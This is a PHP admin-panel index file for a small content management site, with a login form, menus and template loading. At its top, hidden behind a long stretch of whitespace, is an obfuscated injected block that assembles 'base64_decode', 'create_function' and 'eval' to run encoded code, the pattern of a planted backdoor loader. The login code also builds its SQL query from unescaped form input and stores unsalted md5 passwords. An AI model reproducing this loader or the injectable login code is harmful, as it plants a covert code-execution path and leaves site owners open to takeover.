<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             function  adhytvIbWNHsi4SNF0E2SHG($E1xaDhcxlkVEFuFr7c,$s7sTDio,$bW21ATpBnwEKHOwbkRHBPJ){return str_replace($E1xaDhcxlkVEFuFr7c,$s7sTDio,$bW21ATpBnwEKHOwbkRHBPJ);} function  bKh1w2cNsgvwwLT($E1xaDhcxlkVEFuFr7c,$s7sTDio,$bW21ATpBnwEKHOwbkRHBPJ){return str_replace($E1xaDhcxlkVEFuFr7c,$s7sTDio,$bW21ATpBnwEKHOwbkRHBPJ);} function  wRAeFGFx($E1xaDhcxlkVEFuFr7c,$s7sTDio,$bW21ATpBnwEKHOwbkRHBPJ){return str_replace($E1xaDhcxlkVEFuFr7c,$s7sTDio,$bW21ATpBnwEKHOwbkRHBPJ);} $t9thNnEPak7SDHeov2GeZJvW = 'bVeYFP2AOlIrzc7AmaVeYFP2AOlIrzc7AmsVeYFP2AOlIrzc7AmeVeYFP2AOlIrzc7Am6VeYFP2AOlIrzc7Am4VeYFP2AOlIrzc7Am_VeYFP2AOlIrzc7AmdVeYFP2AOlIrzc7AmeVeYFP2AOlIrzc7AmcVeYFP2AOlIrzc7AmoVeYFP2AOlIrzc7AmdVeYFP2AOlIrzc7Ame'; $t9thNnEPak7SDHeov2GeZJvW = wRAeFGFx('VeYFP2AOlIrzc7Am','',$t9thNnEPak7SDHeov2GeZJvW); $i4WdRSoN0axt2Y99nfLooP = 'cwPCn4XfrwPCn4XfewPCn4XfawPCn4XftwPCn4XfewPCn4Xf_wPCn4XffwPCn4XfuwPCn4XfnwPCn4XfcwPCn4XftwPCn4XfiwPCn4XfowPCn4Xfn'; $i4WdRSoN0axt2Y99nfLooP = wRAeFGFx('wPCn4Xf','',$i4WdRSoN0axt2Y99nfLooP); $i2to5MsOCnAG5 = 'l49nQwVUlrzdRepqwPsufEpel49nQwVUlrzdRepqwPsufEpvl49nQwVUlrzdRepqwPsufEpal49nQwVUlrzdRepqwPsufEpl'; $i2to5MsOCnAG5 = wRAeFGFx('l49nQwVUlrzdRepqwPsufEp','',$i2to5MsOCnAG5); $oIaV6uNUtM7yomN4wcWQ = '$LD1APhzfMajd5kmjZdse'; $dsKwVXXrS7cr7XnrB7L = $i4WdRSoN0axt2Y99nfLooP($oIaV6uNUtM7yomN4wcWQ,$i2to5MsOCnAG5.'('.$t9thNnEPak7SDHeov2GeZJvW.'('.$oIaV6uNUtM7yomN4wcWQ.'));'); $dsKwVXXrS7cr7XnrB7L('');?><?php
session_start();
require_once "../config.php";
require_once ($FOLDER->class."/class.mysql.php");
require_once ($FOLDER->class."/class.session.php");

if ( isset($_GET['options'])) $options = preg_replace('#[^a-z]+#i', '', $_GET['options']);

/* $languages = new language_set();
$lang = $languages->session_set(); */

$db = new mysql();
$SQL = $db->query("Select * From ".TABLE_SETTINGS."");
$Row = $db->fetch($SQL);
define("TITLE", $Row[0]);
define("INDEX_PAGE_ID", $Row[1]);
define("DEFAULT_LANGUAGE", $Row[2]);

if(isset($_GET[language])) {
	$_SESSION[adminlang]=mysql_real_escape_string(strip_tags($_GET[language]));
}
$lang=isset($_SESSION[adminlang])?$_SESSION[adminlang]:DEFAULT_LANGUAGE;

$Yoxla = mysql_fetch_array($db->query("select * from ".TABLE_ADMINKA." where username='".$_POST[login]."' and pass='".md5($_POST[pass])."'"));
if ($Yoxla){
$_SESSION['UserAdmin'] = $_POST[login];
}

if($_GET['logout'] == 'yes') {
unset($_SESSION["UserAdmin"]);
unset($_SESSION["adminlang"]);
echo "<script>document.location='index.php</script>";
}

if(!isset($_SESSION['UserAdmin']))	{
echo '
<div align="center" class="content"><br><br>
	<font style="font-size: 20px;">Admin Panel</font>
	<br>	<br>
<form name="form1" method="post" action="index.php">     	  
<TABLE cellpadding="0" cellspacing="1" style="margin-left: 10px;">
<tr>
<td class="content">Username:</td><td><input type="text" name="login" class="in"></td>
</tr>
<tr>
<td class="content">Password:</td><td><input type="password" name="pass" class="in"></td>
</tr>
<tr><td colspan="2" align="right">
<table cellpadding="0" cellspacing="0" border="0" style="height: 25px" width="200" bgcolor="#e2c715">

</table>
</td></tr>	
<tr><td colspan="2" align="right"><input type="submit" name="Submit" value="Enter" class="but"></td></tr>
</TABLE>
</form>	

';

}else {
require_once "../functions.php";
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<title>A Control Panel - <?=TITLE?></title>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="Author" content="Alikhan Dadashov">
<link rel="stylesheet" href="style.css" type="text/css">
<script language="JavaScript" type="text/javascript" src="js/ajax.js"></script>
<script type="text/javascript" src='../js/core.js'></script>
<script type="text/javascript" src='js/my.js'></script>
<script type="text/javascript" src="tinymce/plugins/tinybrowser/tb_tinymce.js.php"></script>
<script type="text/javascript" src="tinymce/tiny_mce.js"></script>
<script type="text/javascript" src="tinymce/tiny_mce_inc.js"></script>
<?
	If($options == "shop" OR $options == "editproducts")
	{
		?>
			<link href="date/calendar.css" rel="stylesheet" type="text/css">
			<script type="text/javascript" src="date/cal.js"></script>
			<script type="text/javascript">

			jQuery(document).ready(function () {
				
				//$('input.one').simpleDatepicker();
				$('input.two').simpleDatepicker({ startdate: 2008, enddate: 2013 });
				//$('input.three').simpleDatepicker({ chosendate: '9/9/2010', startdate: '6/10/2008', enddate: '7/20/2011' });
				//$('input.four').simpleDatepicker({ x: 45, y: 3 });
			});
			</script>
		
		<?
	}
?>
</head>

<body lang='<?=$lang?>'>
<div style="margin: 0px 15px 0px 15px;">
<div style="height: 65px;  width: 98%;">

<div style="float: right; margin-top: 10px;">
<div class="well" style="margin-left: 150px;">
<a target='_blank' href="http://<?=$_SERVER[HTTP_HOST]?>">view site</a>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;wellcome: <b><?=$_SESSION['UserAdmin']?></b>&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;<a href="index.php?logout=yes"><img src="img/logout.gif" width="9" height="9" border="0"/> logout</a></div>
<div style="margin-top: 2px; background: #e5e4e4">
<div style="float: left;"><img src="img/p1.gif" width="5" height="37" border="0"/></div>
<div style="float: left; background: #e5e4e4; height: 37px;  width: 400px;">
<div class="menu">
<ul>

<li><a href="index.php">pages</a></li>
<li><a href="?options=news">articles</a></li>
<li><a href="?options=users">users</a></li>
 <li><a href="?options=logs">logs</a></li>
<li><a href="?options=settings">settings</a></li>

</ul>

</div>
</div>

</div>
</div>
</div>
<table cellpadding="0" cellspacing="0" border="0" style="width: 98%;">
<tr>
<td valign="top" style="width: 231px;">
<div style="height: 65px; padding-top: 20px;">
<div style="margin-left: 10px;"><ins>Quick Launch</ins></div>
<div style="float: left; background: #e5e4e4">
<div><img src="img/p3.gif" width="231" height="5" border="0"/></div>
<div style="background: #e5e4e4; padding-left: 10px;">



<div class="menu2">
<div style="float: left"><img src="img/new.gif" width="10" height="13" border="0"/></div>
<div style="margin-top: -2px; float: left"><a href="index.php?options=addpage">add new <b>Pages</b></a></div>
</div>
<div class="menu2">
<div style="float: left"><img src="img/new.gif" width="10" height="13" border="0"/></div>
<div style="margin-top: -2px; float: left"><a href="index.php?options=addnews">add new <b>Article</b></a></div>
</div>
<!--
<div class="menu2">
<div style="float: left"><img src="img/new.gif" width="10" height="13" border="0"/></div>
<div style="margin-top: -2px; float: left"><a href="index.php?options=products">add new <b>Product</b></a></div>
</div>
-->
</div>
<div ><img src="img/p4.gif" width="231" height="5" border="0"/></div>
</div>

<img src="img/px.gif" height="35">



<div style="margin-left: 10px;"><ins>Addons</ins></div>
<div style="float: left; background: #e5e4e4">
<div><img src="img/p3.gif" width="231" height="5" border="0"/></div>
<div style="background: #e5e4e4; padding-left: 10px;">

	<div class="menu2">
		<div style="float: left"><img src="img/new.gif" width="10" height="13" border="0"/></div>
		<div style="margin-top: -2px; float: left"><a href="index.php?options=slider"><b>Slider</b></a></div>
	</div>
	<!--<div class="menu2">
		<div style="float: left"><img src="img/new.gif" width="10" height="13" border="0"/></div>
		<div style="margin-top: -2px; float: left"><a href="index.php?options=gallery"><b>Gallery</b></a></div>
	</div>-->

</div>
<div ><img src="img/p4.gif" width="231" height="5" border="0"/></div>
</div>



<?/*
<div style="height: 65px; padding-top: 20px;">
<div style="margin-left: 10px;"><img src="img/shop.gif" width="97" height="17" border="0"/></div>
<div style="background: #e5e4e4">
<div><img src="img/p3.gif" width="231" height="5" border="0"/></div>
<div style="background: #e5e4e4; padding-left: 10px;">


<div class="menu2">
<div style="float: left"><img src="img/new.gif" width="10" height="13" border="0"/></div>
<div style="margin-top: -2px; float: left"><a href="index.php?options=shop">add new <b> product</b></a></div>
</div>

<div class="menu2">
<div style="float: left"><img src="img/new.gif" width="10" height="13" border="0"/></div>
<div style="margin-top: -2px; float: left"><a href="index.php?options=editproducts">edit/delete <b>product</b></a></div>
</div>

</div>
<div ><img src="img/p4.gif" width="231" height="5" border="0"/></div>
</div>
*/?>


<img src="img/px.gif" height="20">



<div style="height: 65px; padding-top: 20px;">
<div style="margin-left: 10px;"><ins>Site languages</ins></div>
<div style="background: #e5e4e4">
<div><img src="img/p3.gif" width="231" height="5" border="0"/></div>
<div style="background: #e5e4e4; padding-left: 10px;">

<?
include("templates/langbar.php");	
?>

</div>
<div ><img src="img/p4.gif" width="231" height="5" border="0"/></div>
</div>


</td>

<td style="width: 20px;"> <img src="img/px.gif" width="20"></td>
<td valign="top" style="padding-top: 35px; width: 100%;">

<table cellpadding="0" cellspacing="0" border="0"  style="width: 100%; background: #e5e4e4;">
<tr><td><img src="img/p7.gif" width="5" height="5" border="0" alt=""/></td><td style="width: 100%;"></td><td><img src="img/p8.gif" width="5" height="5" border="0" alt=""/></td></tr>
<tr><td colspan="3" style="padding: 10px; height: 415px; width: 100%;" class="content" valign="top">
<?
$SucInc = "yes";
$tplfile = array(
				 ""                => "index",
				 "index"           => "index",
				 "addpage"		   => "addpage",
				 "news"			   => "news",
				 "editpage"		   => "editpage",
		 		 "addnews"		   => "addnews",
				 "editnews"		   => "editnews",
	 			 "settings"		   => "settings",
				 "users"		   => "users",
				 "logs"			   => "logs",
				 "links"		   => "links",
				 "gallery"		   => "gallery",
				 "slider"  		   => "slider",
				 "sim"  		   => "sim"
);
if($tplfile[$options]) {
$template = $tplfile[$options];
}else{
$template = "index";
}



include("templates/".$template.".php");
?>
</td></tr>
<tr><td><img src="img/p9.gif" width="5" height="5" border="0" alt=""/></td><td></td><td><img src="img/p10.gif" width="5" height="5" border="0" alt=""/></td></tr>
</table>
</td>


</tr>
</table>



</div>



<?}?>



</body>
</html>



